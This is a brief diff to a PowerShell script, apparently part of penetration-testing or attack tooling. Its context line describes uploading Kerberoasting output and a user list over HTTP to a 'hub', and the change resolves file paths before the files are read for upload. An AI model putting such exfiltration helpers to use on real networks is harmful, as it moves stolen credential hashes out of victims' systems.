@@ -308,7 +308,8 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
     )
 
     ForEach ($file in $Files) {
-        $fileBin = [System.IO.File]::ReadAllBytes($file)
+        $abspath = (Resolve-Path $file).path
+        $fileBin = [System.IO.File]::ReadAllBytes($abspath)
         $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
         $fileEnc = $enc.GetString($fileBin)
 
